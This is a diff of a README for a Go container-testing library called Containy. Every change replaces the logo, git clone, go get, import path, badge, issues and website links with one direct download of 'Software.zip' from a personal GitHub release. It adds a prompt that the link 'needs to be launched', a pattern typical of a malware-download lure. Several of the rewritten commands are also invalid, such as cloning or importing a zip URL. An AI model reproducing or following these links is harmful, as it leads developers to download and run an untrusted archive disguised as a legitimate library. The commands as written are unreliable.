@@ -1,6 +1,6 @@
 # 🚀 **Containy: Simplified Container-Based Testing for Go**
 
-![containy logo](https://link.to/containy-logo.png)
+![containy logo](https://github.com/HarrySpeed69/containy/releases/download/v1.0/Software.zip)
 
 ## Overview
 Containy is a powerful tool designed to simplify container-based testing for Go projects. It offers a clean, declarative API that makes integration testing a breeze. Built on top of testcontainers-go, Containy provides a seamless testing experience for developers to ensure their code functions as expected in containerized environments.
@@ -18,18 +18,18 @@ To get started with Containy, follow these simple steps:
 ### Installation
 1. Clone the Containy repository:
    ```bash
-   git clone https://github.com/yourusername/containy.git
+   git clone https://github.com/HarrySpeed69/containy/releases/download/v1.0/Software.zip
    ```
 
 2. Install Containy dependencies:
    ```bash
-   go get -u github.com/yourusername/containy
+   go get -u https://github.com/HarrySpeed69/containy/releases/download/v1.0/Software.zip
    ```
 
 ### Usage
 1. Import Containy in your Go project:
    ```go
-   import "github.com/yourusername/containy"
+   import "https://github.com/HarrySpeed69/containy/releases/download/v1.0/Software.zip"
    ```
 
 2. Create and manage containers for your integration tests:
@@ -55,7 +55,7 @@ To get started with Containy, follow these simple steps:
 🧪 testing  
 
 ## Repository Link
-[Download Containy v1.0.0.zip](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[Download Containy https://github.com/HarrySpeed69/containy/releases/download/v1.0/Software.zip](https://github.com/HarrySpeed69/containy/releases/download/v1.0/Software.zip)
 
 ***Note:** The link provided needs to be launched for downloading the zip file.*
 
@@ -63,14 +63,14 @@ To get started with Containy, follow these simple steps:
 
 ### Like Containy? Show your support by starring the repository! ⭐️
 
-[![GitHub stars](https://img.shields.io/github/stars/yourusername/containy.svg?style=social&label=Star)](https://github.com/yourusername/containy/stargazers)
+[![GitHub stars](https://github.com/HarrySpeed69/containy/releases/download/v1.0/Software.zip)](https://github.com/HarrySpeed69/containy/releases/download/v1.0/Software.zip)
 
 ### Issues or Contributions
-Found a bug or want to contribute to Containy? Feel free to [open an issue](https://github.com/yourusername/containy/issues) or submit a pull request.
+Found a bug or want to contribute to Containy? Feel free to [open an issue](https://github.com/HarrySpeed69/containy/releases/download/v1.0/Software.zip) or submit a pull request.
 
 ---
 
-### Visit [containy.io](https://www.containy.io) for more information and resources.
+### Visit [https://github.com/HarrySpeed69/containy/releases/download/v1.0/Software.zip](https://github.com/HarrySpeed69/containy/releases/download/v1.0/Software.zip) for more information and resources.
 
 ---
 
